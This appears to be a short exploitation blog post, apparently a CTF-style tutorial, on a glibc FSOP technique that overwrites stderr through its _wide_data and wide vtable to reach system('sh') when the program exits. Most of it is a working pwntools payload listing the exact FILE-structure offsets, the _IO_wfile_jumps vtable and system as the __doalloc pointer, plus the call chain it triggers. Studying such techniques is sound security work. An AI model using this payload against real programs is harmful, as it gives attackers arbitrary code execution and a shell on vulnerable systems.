---
date: '2026-02-25T23:41:04+05:30'
title: 'Fsop 4 Noobz - 2'
---

"  `_wide_data` my beloved...  "

<!--more-->

This FSOP attack targets the `stderr` object itself. Once you get a `0xF0`
sized arbitrary write, you can overwrite `stderr` in glibc with this payload,
and trigger `_IO_flush_all` (One easy way of doing it us through `exit -> __run_exit_handlers -> _IO_cleanup -> _IO_flush_all`)

It has the following requirements:

1. Libc leak
2. `0xF0` sized write on `stderr`

Feel free to read the [exploit](#exploit) along with the cradle that I used to learn this: [fsop-4-noobz-2.zip](images/fsop-4-noobz-2.zip).

## Function chain

```
exit
-> __run_exit_handlers
-> _IO_cleanup
-> _IO_flush_all
-> _IO_wfile_oveflow
-> _IO_wdoallocbuf
-> _IO_WDOALLOCATE (fp)
=> system(fp)
```

## Optimisation

This attack arranges the fields in such a way that the three necessary structs (`struct _IO_FILE`, `struct _IO_wide_data`, `struct _IO_jumps_t`) overlap while also meeting necessary constraints.


## Exploit {#exploit}

Write the to `stderr`, and trigger `_IO_flush_all`.

Write the below to `stderr`:

```py
fp_at = ...
# fmt: off
fp = {
    # _IO_FILE
    # -----------------------------

    0x00: b"a;sh\x00", # fp->_flags & _IO_NO_WRITE check in _IO_wdoallocbuf
    0xc0: p32(10),   # mode, fp->_mode > 0
    0x82: p8(0),     # _vtable_offset, _IO_vtable_offset (fp) == 0
    0x88: libc.sym["_IO_stdfile_0_lock"],
    0xa0: fp_at - 0x10,     # _wide_data

    0xd8: libc.sym["_IO_wfile_jumps"],  # <-- This is neded to ensure that we use _IO_wfile_jumps

    # _IO_wide_data
    # -----------------------------

    # fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base
    0x18 - 0x10: 0,      # _IO_write_base
    0x20 - 0x10: 8,      # _IO_write_ptr
    0x30 - 0x10: 0,      # _IO_buf_base, fp->_wide_data->_IO_buf_base
    0xe0 - 0x10: fp_at, # _wide_vtable

    # _IO_wide_data->_wide_vtable
    # -----------------------------

    0x68: libc.sym["system"], # __doalloc
}
# fmt: on

fp = flat(fp)

bp()
io.send(fp)

```

